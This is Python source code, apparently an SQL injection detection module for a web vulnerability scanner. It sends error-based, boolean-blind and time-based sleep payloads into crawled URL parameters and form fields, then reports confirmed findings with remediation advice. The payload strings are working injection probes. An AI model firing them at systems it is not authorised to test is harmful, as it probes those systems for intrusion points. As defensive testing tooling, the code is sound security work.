from __future__ import annotations

import asyncio
import re
from collections import namedtuple
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from ..core import async_http
from ..core.async_http import AsyncFetcher
from ..core.baseline import similarity
from ..core.models import (AREA_WEBAPP, Confidence, Effort, Finding,
                           FindingType, Severity)
from ..core.severity import (AuthRequirement, Exploitability, Exposure, Impact,
                             SeverityFactors, apply)

MODULE_NAME = "sqli"
CATEGORY = "SQL Injection"

_ERROR_SIGNS = re.compile(
    r"(SQL syntax.*MySQL|Warning.*\bmysqli?\b|MySqlException|"
    r"valid MySQL result|PostgreSQL.*ERROR|PG::SyntaxError|"
    r"SQLite/JDBCDriver|SQLite3::|System\.Data\.SQLite|"
    r"ORA-\d{5}|Oracle error|"
    r"Microsoft SQL Server|ODBC SQL Server Driver|Unclosed quotation mark|"
    r"SQLSTATE\[|SQLException|syntax error at or near)",
    re.I,
)

ERROR_PAYLOADS = ["'", "\"", "')", "';"]
BOOL_TRUE = "' OR '1'='1"
BOOL_FALSE = "' AND '1'='2"
SLEEP_SECONDS = 5
TIME_PAYLOADS = [
    f"' OR SLEEP({SLEEP_SECONDS})-- -",
    f"'; WAITFOR DELAY '0:0:{SLEEP_SECONDS}'-- -",
    f"' OR pg_sleep({SLEEP_SECONDS})-- -",
]
TIME_CONTROL = "' OR SLEEP(0)-- -"

Target = namedtuple("Target", "method url param data")


_RISK = (
    "User-supplied input reaches the SQL query as code rather than as data. "
    "The database cannot tell the difference between the developer's query "
    "structure and the attacker's addition to it."
)
_IMPACT = (
    "Read access to every table the application's database user can reach — "
    "which in most deployments is all of them, including password hashes and "
    "personal data. Where the account has write or file privileges it extends "
    "to modifying records, and on MySQL/MSSQL frequently to reading local "
    "files or executing commands on the database host."
)
_STEPS = [
    "Replace string concatenation with parameterised queries (prepared "
    "statements) — bind every user-supplied value, without exception.",
    "Where an identifier (table or column name) must be dynamic, map it "
    "through a fixed allow-list; identifiers cannot be parameterised.",
    "Reduce the database account's privileges to what the application "
    "actually needs: no FILE, no administrative rights, no DDL in production.",
    "Audit the rest of the codebase for the same pattern — a single "
    "vulnerable query is almost never the only one.",
    "Add a WAF rule as a temporary shield while the code fix is developed, "
    "not as the fix itself.",
]
_REFS = [
    "https://cheatsheetseries.owasp.org/cheatsheets/"
    "SQL_Injection_Prevention_Cheat_Sheet.html",
]


def _sqli_finding(name, loc, target, summary, description, evidence, request,
                  technique, verification):
    finding = Finding(
        name=name, severity=Severity.INFO, location=loc,
        description=description,
        remediation=_STEPS[0],
        ftype=FindingType.CONFIRMED_VULN,
        module=MODULE_NAME, category=CATEGORY,
        summary=summary, risk=_RISK, impact=_IMPACT,
        remediation_steps=_STEPS,
        verification=verification,
        references=_REFS,
        effort=Effort.MODERATE,
        score_area=AREA_WEBAPP,
        evidence=evidence,
        request=request,
        verified_by=technique,
        sources=[MODULE_NAME],
    )
    apply(finding, SeverityFactors(
        impact=Impact.TOTAL,
        exploitability=Exploitability.EASY,
        auth=AuthRequirement.NONE,
        exposure=Exposure.PUBLIC,
        confidence=Confidence.CONFIRMED,
    ))
    return finding



def run(ctx, phase=None) -> None:
    ctx.modules_run.append(MODULE_NAME)
    targets = _targets(ctx)
    if phase:
        phase.set_total(max(len(targets), 1))

    async def _driver():
        # Half the crawl concurrency, as the thread pool used, and a timeout wide
        # enough to let the time-based sleep payloads return without tripping it.
        conc = max(ctx.threads // 2, 1)
        async with AsyncFetcher.from_ctx(
                ctx, concurrency=conc,
                timeout=ctx.timeout + SLEEP_SECONDS + 2) as fetcher:
            async def one(target):
                for finding in await _test_param(ctx, fetcher, target):
                    ctx.add_finding(finding)
                phase and phase.step()
            await asyncio.gather(*(one(t) for t in targets))

    async_http.run(_driver())
    phase and phase.done()


def _targets(ctx) -> list[Target]:
    out: list[Target] = []
    for url in ctx.discovered_urls:
        for param in parse_qs(urlparse(url).query).keys():
            out.append(Target("get", url, param, {}))
    for form in ctx.forms:
        method = form.get("method", "get")
        if method not in ("get", "post"):
            continue
        action = form.get("action", ctx.target)
        fields = {i["name"]: (i.get("value") or "1")
                  for i in form.get("inputs", []) if i.get("name")}
        for param in fields:
            data = {k: v for k, v in fields.items() if k != param}
            out.append(Target(method, action, param, data))
    return out


async def _send(ctx, fetcher, target: Target, value: str):
    if target.method == "post":
        payload = dict(target.data)
        payload[target.param] = value
        r = await fetcher.post(target.url, data=payload, allow_redirects=True)
    else:
        parsed = urlparse(target.url)
        q = parse_qs(parsed.query, keep_blank_values=True)
        for k, v in target.data.items():
            q[k] = [v]
        q[target.param] = [value]
        url = urlunparse(parsed._replace(query=urlencode(q, doseq=True)))
        r = await fetcher.get(url, allow_redirects=True)
    if r is None:
        return None, None
    return r.text, r.elapsed.total_seconds()


def _reqline(target: Target, value: str) -> str:
    return f"{target.method.upper()} {target.url}  {target.param}={value}"


async def _test_param(ctx, fetcher, target: Target) -> list[Finding]:
    findings: list[Finding] = []
    clean_body, _ = await _send(ctx, fetcher, target, "lopata1")
    if clean_body is None:
        return findings

    badinput_body, _ = await _send(ctx, fetcher, target, "lopata_$$$_%%%")
    refs = [b for b in (clean_body, badinput_body) if b]

    loc = f"{target.url} [{target.method.upper()} param: {target.param}]"

    for payload in ERROR_PAYLOADS:
        body, _ = await _send(ctx, fetcher, target, "lopata" + payload)
        if body is None:
            continue
        m = _ERROR_SIGNS.search(body)
        if m and not any(_ERROR_SIGNS.search(r) for r in refs):
            findings.append(_sqli_finding(
                name="SQL injection (error-based)",
                loc=loc, target=target,
                summary=f"`{target.param}` reaches a SQL query unsanitised.",
                description=(
                    f"Injecting {payload!r} into `{target.param}` produces a "
                    "database error message that is absent from both the clean "
                    "response and a response containing other special "
                    "characters. The control comparison rules out an error page "
                    "that appears for any unusual input, so the syntax break is "
                    "attributable to the injected quote reaching the query."
                ),
                evidence=body[max(0, m.start() - 20):m.start() + 120].replace("\n", " "),
                request=_reqline(target, "lopata" + payload),
                technique="lopata compared the injected response against clean "
                          "and bad-input controls and found a database error "
                          "only in the injected case",
                verification=(
                    f"Send `{target.param}` with a single quote appended and "
                    "confirm the database error no longer appears once the "
                    "query is parameterised."
                ),
            ))
            return findings

    if await _boolean_blind(ctx, fetcher, target, clean_body):
        findings.append(_sqli_finding(
            name="SQL injection (boolean-based blind)",
            loc=loc, target=target,
            summary=f"`{target.param}` alters query logic without error output.",
            description=(
                f"A condition that is always true (`{BOOL_TRUE}`) injected into "
                f"`{target.param}` returns a page closely matching the normal "
                "response, while an always-false condition returns a materially "
                "different one. The pair was sent twice and behaved identically "
                "both times, which rules out ordinary page variance.\n\n"
                "No error message is needed for this to be exploitable: an "
                "attacker extracts data one bit at a time by asking true/false "
                "questions about it."
            ),
            evidence="TRUE response ~ clean response; FALSE response diverges; "
                     "reproduced on a second independent attempt",
            request=_reqline(target, BOOL_TRUE),
            technique="lopata compared true/false condition pairs against the "
                      "clean response and required the pattern to reproduce",
            verification=(
                "Send the true and false payloads again after parameterising "
                "the query; both should now return identical pages."
            ),
        ))
        return findings

    tf = await _time_blind(ctx, fetcher, target)
    if tf:
        findings.append(tf.finding(loc, target))
    return findings


async def _boolean_blind(ctx, fetcher, target: Target, clean_body: str) -> bool:
    async def pair():
        t, _ = await _send(ctx, fetcher, target, BOOL_TRUE)
        f, _ = await _send(ctx, fetcher, target, BOOL_FALSE)
        return t, f

    t1, f1 = await pair()
    if t1 is None or f1 is None:
        return False
    if not (similarity(clean_body, t1) >= 0.95
            and similarity(clean_body, f1) <= 0.90
            and similarity(t1, f1) <= 0.90):
        return False

    t2, f2 = await pair()
    if t2 is None or f2 is None:
        return False
    return (similarity(clean_body, t2) >= 0.95
            and similarity(clean_body, f2) <= 0.90)


class _TimeHit:
    def __init__(self, payload, delay, control):
        self.payload, self.delay, self.control = payload, delay, control

    def finding(self, loc, target: Target):
        return _sqli_finding(
            name="SQL injection (time-based blind)",
            loc=loc, target=target,
            summary=f"`{target.param}` can control server-side execution time.",
            description=(
                f"A sleep payload injected into `{target.param}` delayed the "
                f"response to {self.delay:.1f}s, against a control of "
                f"{self.control:.1f}s using the same payload with a zero-second "
                "sleep. The delay reproduced on a second attempt and the control "
                "returned promptly both times, which distinguishes this from "
                "network jitter or a slow endpoint.\n\n"
                "The attacker is executing a database function of their choosing "
                "— the sleep is simply the safest way to demonstrate it."
            ),
            evidence=f"injected delay {self.delay:.1f}s vs control "
                     f"{self.control:.1f}s (both measured twice)",
            request=_reqline(target, self.payload),
            technique="lopata measured response timing against a zero-delay "
                      "control payload and required both to reproduce",
            verification=(
                "Re-send the sleep payload after parameterising the query; the "
                "response time should match the control."
            ),
        )


async def _time_blind(ctx, fetcher, target: Target) -> "_TimeHit | None":
    _, control_t = await _send(ctx, fetcher, target, TIME_CONTROL)
    if control_t is None:
        return None
    for payload in TIME_PAYLOADS:
        _, t1 = await _send(ctx, fetcher, target, payload)
        if t1 is None or t1 < SLEEP_SECONDS * 0.8:
            continue
        _, t2 = await _send(ctx, fetcher, target, payload)
        _, c2 = await _send(ctx, fetcher, target, TIME_CONTROL)
        if (t2 is not None and t2 >= SLEEP_SECONDS * 0.8
                and c2 is not None and c2 < SLEEP_SECONDS * 0.5):
            return _TimeHit(payload, (t1 + t2) / 2, (control_t + c2) / 2)
    return None


def register():
    from ..core.plugins import web_module
    return web_module('sqli', run, requires_crawl=True, order=120)
